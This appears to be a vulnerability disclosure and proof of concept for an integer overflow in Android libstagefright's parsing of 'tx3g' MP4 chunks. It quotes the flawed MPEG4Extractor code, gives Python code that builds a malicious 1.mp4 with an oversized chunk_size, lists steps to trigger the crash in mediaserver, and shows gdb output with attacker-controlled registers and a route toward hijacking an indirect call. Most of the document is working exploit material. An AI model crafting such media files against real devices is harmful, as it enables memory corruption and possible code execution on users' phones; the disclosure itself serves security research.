Android libstagefright 'tx3g' chunk overflow

To get latest libstagefright sources:
$ repo sync frameworks/av
 
Code from libstagefright/MPEG4Extractor.cpp: (parseChunk( method)

<code>
...	
        case FOURCC('t', 'x', '3', 'g'):
        {
            uint32_t type;
            const void *data;
            size_t size = 0;
[1]         if (!mLastTrack->meta->findData(
                    kKeyTextFormatData, &type, &data, &size)) {
                size = 0;
            }

[2]         uint8_t *buffer = new (std::nothrow) uint8_t[size + chunk_size];
            if (buffer == NULL) {
                return ERROR_MALFORMED;
            }

            if (size > 0) {
                memcpy(buffer, data, size);
            }

[3]          if ((size_t)(mDataSource->readAt(*offset, buffer + size, chunk_size))
                    < chunk_size) {
                delete[] buffer;
                buffer = NULL;

                // advance read pointer so we don't end up reading this again
                *offset += chunk_size;
                return ERROR_IO;
            }
            mLastTrack->meta->setData(
                    kKeyTextFormatData, 0, buffer, size + chunk_size);


</code>

We need to tx3g chunks to exploit the overflow.
First chunk will set 'kKeyTextFormatData' tag. 
Second chunk is provided with 'chunk_size' (it is unsigned 64 integer) equal to 0xffffffffffffffff, 
on line #2 overflow will occur and small buffer is allocated. 
On line #3 it is overwritten with our data.

File 1.mp4 contains two 'tx3g' chunks, which have been created with this code:

s=struct.pack('>L',1)
s+='tx3g'
s+=struct.pack('>L',0x0000000)
s+=struct.pack('>L',20)
s+='a'*(20-16)

s+=struct.pack('>L',1)
s+='tx3g'
s+=struct.pack('>L',0xffffffff)
s+=struct.pack('>L',0xffffffff)
s+='A'*24000


I am using Android Virtual Device with Android 4.3.2 and x86 cpu for this bug.
Use the following command to manage AVDs:
$ android avd


How to test :
1) start the device
2) copy file to /mnt/sdcard
$ adb push 1.mp4 /mnt/sdcard/1.mp4

3) open in Safari: file:///mnt/sdcard/1.mp4

4) attach to /system/bin/mediaserver on a device

5) back to device UI window, switch to Safari, click 'Play' to play 1.mp4, mediaserver will crash

Program received signal SIGSEGV, Segmentation fault.
0xb76b1539 in android_atomic_dec () from /Users/admin/dist/android/lib/libcutils.so
(gdb) x/1i $pc
=> 0xb76b1539 <android_atomic_dec+9>:	lock xadd %eax,(%edx)
(gdb) i r edx
edx            0x41414141	1094795585
(gdb) i r eax
eax            0xffffffff       -1
(gdb) bt 2
#0  0xb76b1539 in android_atomic_dec () from /Users/el/dist/android/lib/libcutils.so
#1  0xb754404a in android::RefBase::decStrong(void const*) const () from /Users/el/dist/android/lib/libutils.so
(More stack frames follow...)
(gdb) x/10i 0xb754404a
   0xb754404a <_ZNK7android7RefBase9decStrongEPKv+42>:	cmp    $0x1,%eax
   0xb754404d <_ZNK7android7RefBase9decStrongEPKv+45>:	je     0xb75440a8 <_ZNK7android7RefBase9decStrongEPKv+136>
(gdb) x/10i 0xb75440a8
   0xb75440a8 <_ZNK7android7RefBase9decStrongEPKv+136>:	mov    0x8(%esi),%eax
   0xb75440ab <_ZNK7android7RefBase9decStrongEPKv+139>:	mov    0x24(%esp),%ecx
   0xb75440af <_ZNK7android7RefBase9decStrongEPKv+143>:	mov    (%eax),%edx
   0xb75440b1 <_ZNK7android7RefBase9decStrongEPKv+145>:	mov    %eax,(%esp)
   0xb75440b4 <_ZNK7android7RefBase9decStrongEPKv+148>:	mov    %ecx,0x4(%esp)
   0xb75440b8 <_ZNK7android7RefBase9decStrongEPKv+152>:	call   *0xc(%edx)
   0xb75440bb <_ZNK7android7RefBase9decStrongEPKv+155>:	mov    0xc(%esi),%eax
   0xb75440be <_ZNK7android7RefBase9decStrongEPKv+158>:	test   $0x1,%al
   0xb75440c0 <_ZNK7android7RefBase9decStrongEPKv+160>:	jne    0xb754404f <_ZNK7android7RefBase9decStrongEPKv+47>
   0xb75440c2 <_ZNK7android7RefBase9decStrongEPKv+162>:	mov    (%edi),%eax
(gdb) i r esi
esi            0x41414141	1094795585

So if 'edx' points to dword which contains 2 jump to 0xb75440a8 is executed.
